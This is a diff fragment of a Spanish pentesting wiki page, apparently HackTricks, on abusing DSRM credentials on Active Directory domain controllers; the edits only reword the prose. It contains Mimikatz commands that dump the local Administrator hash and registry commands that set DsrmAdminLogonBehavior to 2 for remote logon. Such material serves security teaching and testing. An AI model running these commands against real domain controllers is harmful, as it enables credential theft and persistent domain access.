@@ -16,12 +16,12 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 
 # Credenciales de DSRM
 
-Hay una cuenta de **administrador local** dentro de cada **DC**. Teniendo privilegios de administrador en esta máquina, puedes usar mimikatz para **extraer el hash del Administrador local**. Luego, modificando un registro para **activar esta contraseña** para que puedas acceder de forma remota a este usuario Administrador local.\
+Hay una cuenta de **administrador local** dentro de cada **DC**. Teniendo privilegios de administrador en esta máquina, puedes usar mimikatz para **extraer el hash del Administrador local**. Luego, modificando un registro para **activar esta contraseña** para que puedas acceder remotamente a este usuario Administrador local.\
 Primero necesitamos **extraer** el **hash** del usuario **Administrador local** dentro del DC:
 ```bash
 Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
 ```
-Luego necesitamos verificar si esa cuenta funcionará, y si la clave del registro tiene el valor "0" o no existe, necesitas **configurarlo a "2"**:
+Entonces necesitamos verificar si esa cuenta funcionará, y si la clave del registro tiene el valor "0" o no existe, necesitas **configurarla a "2"**:
 ```bash
 Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior #Check if the key exists and get the value
 New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD #Create key with value "2" if it doesn't exist
